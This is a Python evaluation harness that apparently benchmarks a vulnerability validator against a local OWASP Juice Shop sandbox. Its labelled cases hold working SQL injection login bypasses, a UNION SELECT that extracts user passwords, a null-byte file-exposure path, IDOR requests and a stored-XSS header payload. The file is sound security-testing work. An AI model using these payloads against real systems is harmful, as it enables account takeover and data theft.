"""Expanded Juice Shop evaluation for the validator.

A larger labelled set than the Phase 1 benchmark (SQLi / XSS / IDOR / auth +
access control + sensitive-file exposure), run against a LOCAL Juice Shop
sandbox, to measure precision / recall / FP and -- deliberately -- expose where
the harnesses do NOT have coverage (stored XSS, blind/time-based SQLi).

Local sandbox only; sends real payloads, so the dry-run gate must be cleared for
the sandbox target. The caller scope-checks the base URL.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from urllib.parse import quote

import yaml

from ..config import Config
from ..scope import Platform, Target, TargetAuth
from ..validator.benchmark import XSS_PAYLOAD, Metrics, _prepare_victim
from ..validator.engine import Validator
from ..validator.models import Candidate, ValidationStatus, VulnClass

_UNION = "qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"
_CREDS = "secrets/juiceshop-eval.yaml"


@dataclass
class Case:
    candidate: Candidate
    vulnerable: bool
    category: str  # "supported" | "limitation"
    note: str = ""


def _httppoc(cid, cls, title, method, url, oracle, body=None) -> Candidate:
    req: dict = {"method": method, "url": url}
    if body is not None:
        req["body"] = body
    return Candidate(
        id=cid,
        target_name="juice",
        vuln_class=cls,
        title=title,
        url=url,
        host="localhost",
        params={"requests": [req], "oracle": oracle},
    )


def build_cases(base: str, victim_basket_url: str, basket_marker: str) -> list[Case]:
    login = {
        "url": f"{base}/rest/user/login",
        "method": "POST",
        "token_json_path": "authentication.token",
    }
    auth_oracle = {"type": "contains", "value": "authentication"}

    def idor(cid, title, victim_url, marker) -> Candidate:
        return Candidate(
            id=cid,
            target_name="juice",
            vuln_class=VulnClass.IDOR,
            title=title,
            url=victim_url,
            host="localhost",
            params={"login": login, "victim_url": victim_url, "victim_marker": marker},
        )

    def xss(cid, title, q) -> Candidate:
        url = f"{base}/#/search?q={q}"
        return Candidate(
            id=cid,
            target_name="juice",
            vuln_class=VulnClass.XSS,
            title=title,
            url=url,
            host="localhost",
            # DOM-XSS proof: the harness mints a nonce and renders it into the
            # {NONCE} in url_template, then confirms only if the dialog carries it.
            params={"mode": "dom", "url_template": url},
        )

    S, L = "supported", "limitation"
    return [
        # ---- true positives (expect CONFIRMED) ----
        Case(
            _httppoc(
                "sqli-login-or1",
                VulnClass.INJECTION,
                "SQLi auth bypass ' OR 1=1--",
                "POST",
                f"{base}/rest/user/login",
                auth_oracle,
                {"email": "' OR 1=1--", "password": "x"},
            ),
            True,
            S,
        ),
        Case(
            _httppoc(
                "sqli-login-quoted",
                VulnClass.INJECTION,
                "SQLi auth bypass ' OR '1'='1'--",
                "POST",
                f"{base}/rest/user/login",
                auth_oracle,
                {"email": "' OR '1'='1'--", "password": "x"},
            ),
            True,
            S,
        ),
        Case(
            _httppoc(
                "sqli-login-admin",
                VulnClass.INJECTION,
                "SQLi auth bypass admin'--",
                "POST",
                f"{base}/rest/user/login",
                auth_oracle,
                {"email": "admin@juice-sh.op'--", "password": "x"},
            ),
            True,
            S,
        ),
        Case(
            _httppoc(
                "sqli-error-search",
                VulnClass.INJECTION,
                "Error-based SQLi in product search",
                "GET",
                f"{base}/rest/products/search?q={quote(_UNION)}",
                {"type": "contains", "value": "SQLITE_ERROR"},
            ),
            True,
            S,
        ),
        Case(
            _httppoc(
                "expose-ftp-nullbyte",
                VulnClass.OTHER,
                "Backup file via poison null byte",
                "GET",
                f"{base}/ftp/package.json.bak%2500.md",
                {"type": "contains", "value": "intentionally insecure"},
            ),
            True,
            S,
        ),
        Case(
            _httppoc(
                "expose-ftp-legal",
                VulnClass.OTHER,
                "Direct access to /ftp/legal.md",
                "GET",
                f"{base}/ftp/legal.md",
                {"type": "contains", "value": "Legal Information"},
            ),
            True,
            S,
        ),
        Case(
            _httppoc(
                "expose-ftp-listing",
                VulnClass.OTHER,
                "Directory browsing on /ftp",
                "GET",
                f"{base}/ftp",
                {"type": "contains", "value": "acquisitions.md"},
            ),
            True,
            S,
        ),
        Case(
            idor(
                "idor-basket", "IDOR: read another user's basket", victim_basket_url, basket_marker
            ),
            True,
            S,
        ),
        Case(
            idor(
                "idor-apiuser",
                "Broken access control: read admin via /api/Users/1",
                f"{base}/api/Users/1",
                "admin@juice-sh.op",
            ),
            True,
            S,
        ),
        Case(xss("xss-search-dom", "DOM XSS via search query", XSS_PAYLOAD), True, S),
        # ---- false alarms (expect REJECTED) ----
        Case(
            _httppoc(
                "fake-sqli-badlogin",
                VulnClass.INJECTION,
                "Failed login mislabelled SQLi",
                "POST",
                f"{base}/rest/user/login",
                auth_oracle,
                {"email": "nobody@t.local", "password": "wrong"},
            ),
            False,
            S,
        ),
        Case(
            _httppoc(
                "fake-sqli-benign-search",
                VulnClass.INJECTION,
                "Benign search mislabelled SQLi",
                "GET",
                f"{base}/rest/products/search?q=apple",
                {"type": "contains", "value": "SQLITE_ERROR"},
            ),
            False,
            S,
        ),
        Case(
            _httppoc(
                "fake-auth-whoami",
                VulnClass.AUTH,
                "whoami claimed to leak identity",
                "GET",
                f"{base}/rest/user/whoami",
                {"type": "contains", "value": "@"},
            ),
            False,
            S,
        ),
        Case(
            _httppoc(
                "fake-ac-apiusers",
                VulnClass.AUTH,
                "Unauthed /api/Users claimed readable",
                "GET",
                f"{base}/api/Users",
                {"type": "contains", "value": "@"},
            ),
            False,
            S,
        ),
        Case(
            idor(
                "fake-idor-enforced",
                "Claimed IDOR on admin-only /api/Users (enforced)",
                f"{base}/api/Users",
                "totpSecret",
            ),
            False,
            S,
        ),
        Case(
            xss("fake-xss-inert", "Reflected but non-executing content", "<b>inert123</b>"),
            False,
            S,
        ),
        # ---- cases that now exercise the new capabilities, but stay MISSED on
        # this target for TARGET-side reasons (not a harness gap). The validator
        # capabilities they use are proven elsewhere (see notes). ----
        Case(
            Candidate(
                id="limit-blind-sqli",
                target_name="juice",
                vuln_class=VulnClass.INJECTION,
                title="Time-based blind SQLi on login (timing oracle)",
                url=f"{base}/rest/user/login",
                host="localhost",
                params={
                    "requests": [
                        {
                            "name": "base",
                            "method": "POST",
                            "url": f"{base}/rest/user/login",
                            "body": {"email": "a@b.co", "password": "x"},
                        },
                        {
                            "name": "inj",
                            "method": "POST",
                            "url": f"{base}/rest/user/login",
                            "body": {"email": "' OR SLEEP(3)-- ", "password": "x"},
                        },
                    ],
                    "oracle": {
                        "type": "timing",
                        "baseline": "base",
                        "inject": "inj",
                        "min_delta_seconds": 2.0,
                    },
                },
            ),
            True,
            L,
            "timing oracle now implemented and proven (unit + e2e here, and live on "
            "DVWA/MySQL); Juice Shop runs SQLite, which has no SLEEP(), so a time-based "
            "delay is not expected on THIS target -- the remaining gap is target-side",
        ),
        Case(
            Candidate(
                id="limit-stored-xss",
                target_name="juice",
                vuln_class=VulnClass.XSS,
                title="Stored XSS (inject then render on another page)",
                url=f"{base}/#/privacy-security/last-login-ip",
                host="localhost",
                params={
                    "mode": "stored",
                    "inject": {
                        "method": "GET",
                        "url": f"{base}/rest/basket",
                        "headers": {
                            "True-Client-IP": (
                                "<iframe src=\"javascript:alert('stored-xss-marker')\">"
                            )
                        },
                    },
                    "view_url": f"{base}/#/privacy-security/last-login-ip",
                    "expect_marker": "stored-xss-marker",
                },
            ),
            True,
            L,
            "stored-XSS harness (inject -> render on a different page) now implemented "
            "and proven end to end in a real browser (tests/test_validator_xss_browser.py); "
            "the documented Juice Shop sink renders on the authenticated last-login-ip "
            "page, which the XSS harness browser does not yet carry a session into",
        ),
    ]


def run_eval(base_url: str, config: Config | None = None):
    config = config or Config(dry_run=False)
    accounts, victim_basket_url, basket_marker = _prepare_victim(base_url)
    creds = Path(_CREDS)
    creds.parent.mkdir(parents=True, exist_ok=True)
    creds.write_text(yaml.safe_dump(accounts))
    target = Target(
        name="juice",
        platform=Platform.SELF,
        safe_harbor_url="https://owasp.org/www-project-juice-shop/",
        in_scope=["localhost", "127.0.0.1"],
        dry_run=False,
        auth=TargetAuth(multi_account=True, creds_ref=_CREDS),
    )
    validator = Validator(config)
    m = Metrics()
    m_supported = Metrics()
    rows = []
    for case in build_cases(base_url, victim_basket_url, basket_marker):
        res = validator.validate(case.candidate, target)
        confirmed = res.status is ValidationStatus.CONFIRMED
        outcome = (
            "tp"
            if (case.vulnerable and confirmed)
            else "fn"
            if (case.vulnerable and not confirmed)
            else "fp"
            if ((not case.vulnerable) and confirmed)
            else "tn"
        )
        meters = [m, m_supported] if case.category == "supported" else [m]
        for meter in meters:
            setattr(meter, outcome, getattr(meter, outcome) + 1)
        rows.append(
            (
                case.candidate.id,
                case.candidate.vuln_class.value,
                case.category,
                case.vulnerable,
                res.status.value,
                case.note,
                res.reason or "",
            )
        )
    return m, m_supported, rows
